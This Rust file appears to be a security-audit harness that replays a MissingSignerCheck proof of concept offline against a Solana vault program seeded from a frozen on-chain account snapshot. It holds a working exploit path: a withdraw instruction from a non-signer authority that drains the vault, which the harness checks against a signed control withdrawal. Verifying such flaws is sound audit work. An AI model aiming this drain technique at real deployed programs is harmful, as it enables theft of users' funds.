//! V4 (#842) — snapshot replay. Seeds the vault account from a FROZEN on-chain account
//! snapshot (a host-side RPC dump produced by `snapshot-rpc.sh`, mounted read-only into the
//! sandbox as `snapshot.txt`) and replays the MissingSignerCheck invariant through the REAL
//! solana-runtime SVM, fully offline (zero network). The snapshot's real `lamports` + its
//! first 8 data bytes (little-endian) become the vault account; the account owner is rebound
//! to the in-scope program (the test program is not deployed on-chain, so it cannot own a
//! real dumped account — only its lamports + data bytes are replayed). Same two-sided
//! contract as the default PoC: CONTROL accepted, EXPLOIT (non-signer drain) violates.
use solana_harness::target;
use solana_program_test::{processor, BanksClient, ProgramTest};
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
};
use std::fs;

fn field(s: &str, key: &str) -> u64 {
    for line in s.lines() {
        if let Some(rest) = line.strip_prefix(key) {
            if let Some(v) = rest.strip_prefix('=') {
                return v.trim().parse().unwrap_or(0);
            }
        }
    }
    0
}

fn vault_account(program_id: Pubkey, lamports: u64, balance: u64) -> Account {
    Account {
        lamports,
        data: balance.to_le_bytes().to_vec(),
        owner: program_id,
        executable: false,
        rent_epoch: 0,
    }
}

fn withdraw_ix(program_id: Pubkey, vault: Pubkey, authority: Pubkey, signs: bool, amount: u64) -> Instruction {
    Instruction {
        program_id,
        accounts: vec![
            AccountMeta::new(vault, false),
            AccountMeta::new_readonly(authority, signs),
        ],
        data: amount.to_le_bytes().to_vec(),
    }
}

async fn balance_of(banks: &mut BanksClient, vault: Pubkey) -> u64 {
    match banks.get_account(vault).await.ok().flatten() {
        Some(a) if a.data.len() >= 8 => u64::from_le_bytes(a.data[0..8].try_into().unwrap()),
        _ => u64::MAX,
    }
}

#[tokio::main]
async fn main() {
    let snap = fs::read_to_string("snapshot.txt").unwrap_or_default();
    let lamports = field(&snap, "account.lamports");
    let balance = field(&snap, "account.data_first8_le");
    if balance == 0 {
        // A zero-value snapshot has nothing to drain; "drained to 0" would be vacuous, so
        // refuse to claim a violation (no false-VERIFIED on an empty/foreign snapshot).
        eprintln!("snapshot replay inconclusive: frozen account's first 8 data bytes are zero (no balance to drain)");
        std::process::exit(3);
    }

    let program_id = Pubkey::new_unique();
    let vault_ctrl = Pubkey::new_unique();
    let vault_exploit = Pubkey::new_unique();
    let authority = Keypair::new();

    let mut pt =
        ProgramTest::new("solana_harness", program_id, processor!(target::process_instruction));
    pt.add_account(vault_ctrl, vault_account(program_id, lamports, balance));
    pt.add_account(vault_exploit, vault_account(program_id, lamports, balance));
    let (mut banks, payer, recent) = pt.start().await;

    // CONTROL: the legitimate authority (a signer) withdraws the snapshotted balance.
    let mut tx_c = Transaction::new_with_payer(
        &[withdraw_ix(program_id, vault_ctrl, authority.pubkey(), true, balance)],
        Some(&payer.pubkey()),
    );
    tx_c.sign(&[&payer, &authority], recent);
    let _ = banks.process_transaction(tx_c).await;
    let ctrl = balance_of(&mut banks, vault_ctrl).await;
    if ctrl == 0 {
        eprintln!("CONTROL OK: authorized signer withdrew the snapshotted vault balance {} -> 0", balance);
    } else {
        eprintln!("control failed: authorized withdraw not accepted (balance {})", ctrl);
        std::process::exit(2);
    }

    // EXPLOIT: an unauthorized non-signer drains a fresh snapshotted vault.
    let bogus_authority = Pubkey::new_unique();
    let recent2 = banks.get_latest_blockhash().await.unwrap_or(recent);
    let mut tx_e = Transaction::new_with_payer(
        &[withdraw_ix(program_id, vault_exploit, bogus_authority, false, balance)],
        Some(&payer.pubkey()),
    );
    tx_e.sign(&[&payer], recent2);
    let _ = banks.process_transaction(tx_e).await;
    let exploit = balance_of(&mut banks, vault_exploit).await;
    if exploit == 0 {
        eprintln!("INVARIANT VIOLATED: unauthorized non-signer drained the snapshotted vault balance {} -> 0 (MissingSignerCheck)", balance);
        std::process::exit(101);
    } else {
        eprintln!("invariant held: unauthorized withdraw rejected (balance {})", exploit);
    }
}
